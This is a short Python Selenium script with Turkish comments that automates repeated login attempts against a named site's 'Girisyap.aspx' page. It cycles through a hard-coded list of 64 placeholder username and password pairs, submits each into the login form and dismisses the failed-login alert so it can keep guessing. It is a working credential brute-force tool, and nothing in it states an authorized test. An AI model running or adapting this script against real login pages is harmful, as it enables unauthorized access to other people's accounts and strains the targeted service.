from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
import time

# Chrome WebDriver'ı başlat
driver = webdriver.Chrome()

# Hedef web sitesinin URL'si
url = "http://okkess.online/Girisyap.aspx"

# Kullanıcı adı ve şifre kombinasyonları
user_passwords = [
    {"username": "user1", "password": "pass1"},
    {"username": "user2", "password": "pass2"},
    {"username": "user3", "password": "pass3"},
    {"username": "user4", "password": "pass4"},
    {"username": "user5", "password": "pass5"},
    {"username": "user6", "password": "pass6"},
    {"username": "user7", "password": "pass7"},
    {"username": "user8", "password": "pass8"},
    {"username": "user9", "password": "pass9"},
    {"username": "user9", "password": "pass10"},
    {"username": "user9", "password": "pass11"},
    {"username": "user5", "password": "pass12"},
    {"username": "user1", "password": "pass13"},
    {"username": "user2", "password": "pass14"},
    {"username": "user3", "password": "pass15"},
    {"username": "user4", "password": "pass16"},
    {"username": "user5", "password": "pass17"},
    {"username": "user1", "password": "pass18"},
    {"username": "user2", "password": "pass19"},
    {"username": "user3", "password": "pass20"},
    {"username": "user4", "password": "pass21"},
    {"username": "user5", "password": "pass22"},
    {"username": "user1", "password": "pass23"},
    {"username": "user2", "password": "pass24"},
    {"username": "user3", "password": "pass25"},
    {"username": "user4", "password": "pass26"},
    {"username": "user5", "password": "pass27"},
    {"username": "user1", "password": "pass28"},
    {"username": "user2", "password": "pass29"},
    {"username": "user3", "password": "pass30"},
    {"username": "user4", "password": "pass31"},
    {"username": "user5", "password": "pass32"},
    {"username": "user1", "password": "pass33"},
    {"username": "user2", "password": "pass34"},
    {"username": "user3", "password": "pass35"},
    {"username": "user4", "password": "pass36"},
    {"username": "user5", "password": "pass37"},
    {"username": "user1", "password": "pass38"},
    {"username": "user2", "password": "pass39"},
    {"username": "user3", "password": "pass40"},
    {"username": "user4", "password": "pass41"},
    {"username": "user5", "password": "pass42"},
    {"username": "user1", "password": "pass43"},
    {"username": "user2", "password": "pass44"},
    {"username": "user3", "password": "pass45"},
    {"username": "user4", "password": "pass46"},
    {"username": "user5", "password": "pass47"},
    {"username": "user1", "password": "pass48"},
    {"username": "user2", "password": "pass49"},
    {"username": "user3", "password": "pass50"},
    {"username": "user4", "password": "pass51"},
    {"username": "user5", "password": "pass52"},
    {"username": "user1", "password": "pass53"},
    {"username": "user2", "password": "pass54"},
    {"username": "user3", "password": "pass55"},
    {"username": "user4", "password": "pass56"},
    {"username": "user12", "password": "pass57"},
    {"username": "user13", "password": "pass58"},
    {"username": "user14", "password": "pass59"},
    {"username": "user15", "password": "pass60"},
    {"username": "user16", "password": "pass61"},
    {"username": "user17", "password": "pass62"},
    {"username": "user18", "password": "pass63"},
    {"username": "user121", "password": "pass64"},

]


for user_pass in user_passwords:
   
    driver.get(url)

    time.sleep(1)  # 1 saniye 



    username = driver.find_element(By.CSS_SELECTOR, 'input[name="TxtKullanici"]')
    password = driver.find_element(By.CSS_SELECTOR, 'input[name="TxtSifre"]')

  
    username.send_keys(user_pass["username"])
    password.send_keys(user_pass["password"])


    password.send_keys(Keys.RETURN)

        #Kullanıcı adını veya şifreyi yanlış girince çıkan alert'i geçmek için bu kodu kullanıyoruz.
    try:
       
        alert = WebDriverWait(driver, 3).until(EC.alert_is_present())
        alert.accept()  
    except:
        pass 



